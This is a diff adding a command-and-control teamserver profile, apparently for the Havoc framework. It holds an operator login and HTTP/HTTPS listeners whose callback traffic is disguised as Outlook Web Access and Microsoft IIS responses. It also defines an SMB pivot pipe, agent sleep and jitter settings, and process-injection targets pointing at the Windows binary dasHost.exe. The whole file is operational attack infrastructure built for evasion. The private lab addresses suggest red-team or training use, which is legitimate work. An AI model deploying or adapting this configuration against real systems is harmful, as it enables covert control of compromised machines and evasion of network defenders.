@@ -1,0 +1,67 @@
+Teamserver {
+    Host = "0.0.0.0"
+    Port = "10400"
+
+    Build {
+        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
+        Nasm = "/usr/bin/nasm"
+    }
+}
+Operators {
+    user "gerbsec" {
+        Password = "gerbsec"
+    }
+}
+Listeners {
+    Http {
+        Name         = "Http"
+        KillDate     = "2024-06-26 16:17:31"
+        WorkingHours = "0:00-23:59"
+        Hosts        =  ["10.0.254.201", "10.0.254.202", "10.0.254.203", "10.0.254.204", "10.0.254.205", "10.0.254.206"]
+        HostBind     = "0.0.0.0"
+        HostRotation = "round-robin"
+        PortBind     =  80
+        PortConn     =  80
+        Secure       =  false
+        UserAgent    = "Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/5779-03-25 13:45:25 Firefox/3.6.18"
+        Uris         =  ["/owa/", "/OWA/"]
+        Headers      =  ["Host: www.outlook.live.com", "Accept: */*", "Cookie: MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42=ZG0yMzA2KjEs"]
+
+        Response {
+            Headers  = ["Cache-Control: no-cache", "Pragma: no-cache", "Content-Type: text/html; charset=utf-8", "Server: Microsoft-IIS/10.0", "request-id: 6cfcf35d-0680-4853-98c4-b16723708fc9", "X-CalculatedBETarget: BY2PR06MB549.namprd06.prod.outlook.com", "X-Content-Type-Options: nosniff", "X-OWA-Version: 15.1.1240.20", "X-OWA-OWSVersion: V2017_06_15", "X-OWA-MinimumSupportedOWSVersion: V2_6", "X-Frame-Options: SAMEORIGIN", "X-DiagInfo: BY2PR06MB549", "X-UA-Compatible: IE=EmulateIE7", "X-Powered-By: ASP.NET", "X-FEServer: CY4PR02CA0010", "Connection: close"]
+        }
+    }
+
+    Http {
+        Name         = "Agent Listener - HTTP/s"
+        KillDate     = "2023-12-04 11:35:06"
+        WorkingHours = "0:00-23:59"
+        Hosts        =  ["10.0.254.201", "10.0.254.202", "10.0.254.203", "10.0.254.204", "10.0.254.205", "10.0.254.206"]
+        HostBind     = "0.0.0.0"
+        HostRotation = "round-robin"
+        PortBind     =  443
+        PortConn     =  443
+        Secure       =  true
+        UserAgent    = "Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/5779-03-25 13:45:25 Firefox/3.6.18"
+        Uris         =  ["/owa/", "/OWA/"]
+        Headers      =  ["Host: www.outlook.live.com", "Accept: */*", "Cookie: MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42=ZG0yMzA2KjEs"]
+
+        Response {
+            Headers  = ["Cache-Control: no-cache", "Pragma: no-cache", "Content-Type: text/html; charset=utf-8", "Server: Microsoft-IIS/10.0", "request-id: 6cfcf35d-0680-4853-98c4-b16723708fc9", "X-CalculatedBETarget: BY2PR06MB549.namprd06.prod.outlook.com", "X-Content-Type-Options: nosniff", "X-OWA-Version: 15.1.1240.20", "X-OWA-OWSVersion: V2017_06_15", "X-OWA-MinimumSupportedOWSVersion: V2_6", "X-Frame-Options: SAMEORIGIN", "X-DiagInfo: BY2PR06MB549", "X-UA-Compatible: IE=EmulateIE7", "X-Powered-By: ASP.NET", "X-FEServer: CY4PR02CA0010", "Connection: close"]
+        }
+    }
+
+    Smb {
+        Name         = "Pivot - Smb"
+        PipeName     = "tcppipe.61093-17423-418735"
+    }
+}
+Demon {
+    Sleep  = 49
+    Jitter = 55
+    Injection {
+        Spawn64 = "C:\\Windows\\System32\\dasHost.exe d1c56252-c683-4e0fa7e2add186e68ebd7"
+        Spawn32 = "C:\\Windows\\System32\\dasHost.exe d1c56252-c683-4e0fa7e2add186e68ebd7" 
+    }
+}
